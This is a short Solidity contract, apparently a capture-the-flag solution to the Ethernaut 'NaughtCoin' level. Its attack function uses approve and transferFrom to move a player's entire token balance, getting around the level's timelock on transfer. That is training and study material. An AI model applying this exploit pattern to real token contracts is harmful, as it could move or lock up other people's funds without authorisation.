pragma solidity ^0.8.0;

import './NaughtCoin.sol';

contract NaughtCoinAttack {

  function attack(address _target, address _player) public {
    NaughtCoin naughtCoin = NaughtCoin(_target);
    naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player));
  }
  
  function approveMe(address _target, address _myAddr, uint256 amount) public {
      NaughtCoin naughtCoin = NaughtCoin(_target);
      naughtCoin.approve(_myAddr, amount);
  }
}

